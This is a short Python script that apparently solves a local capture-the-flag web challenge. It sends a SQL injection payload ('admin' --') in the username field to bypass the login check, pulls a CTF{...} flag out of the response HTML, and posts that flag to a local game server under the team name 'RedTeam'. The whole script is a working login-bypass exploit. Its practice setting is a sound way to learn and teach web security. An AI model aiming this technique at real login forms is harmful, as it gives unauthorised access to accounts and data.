import requests
import sys

# Configuration
TARGET_URL = "http://127.0.0.1:5000"
GAME_SERVER = "http://localhost:3000/submit"
TEAM_NAME = "RedTeam"

def run_attack():
    print(f"[*] Attacking Web Application: {TARGET_URL}") 
    
    payload_username = "admin' --"
    payload_password = "anything" # Doesn't matter, it's commented out!
    
    print(f"[*] Injecting Payload: {payload_username}")
    
    data = {
        "username": payload_username,
        "password": payload_password
    }
    
    try:
        # Send POST request acting like a browser
        response = requests.post(TARGET_URL, data=data)
        
        if "Access Granted" in response.text:
            print("[+] Login Bypassed Successfully!")
            
            # Extract Flag from HTML
            if "CTF{" in response.text:
                start = response.text.find("CTF{")
                end = response.text.find("</h3>", start)
                flag = response.text[start:end]
                print(f"[+] Found Flag: {flag}")
                return flag
        else:
            print("[-] Attack Failed. Check the web server output.")
            
    except requests.exceptions.ConnectionError:
        print("[!] Could not connect to Web App. Is 'web_challenge.py' running?")

    return None

def submit_to_server(flag):
    if not flag: return

    print(f"[*] Submitting to Game Server: {GAME_SERVER}")
    try:
        data = {"team_name": TEAM_NAME, "flag": flag}
        r = requests.post(GAME_SERVER, json=data)
        if r.status_code == 200:
            print(f"[+] Server Accepted: {r.text}")
        else:
            print(f"[!] Server Rejected: {r.status_code} | {r.text}")
    except Exception as e:
        print(f"[!] Server connection failed: {e}")

if __name__ == "__main__":
    found_flag = run_attack()
    if found_flag:
        submit_to_server(found_flag)
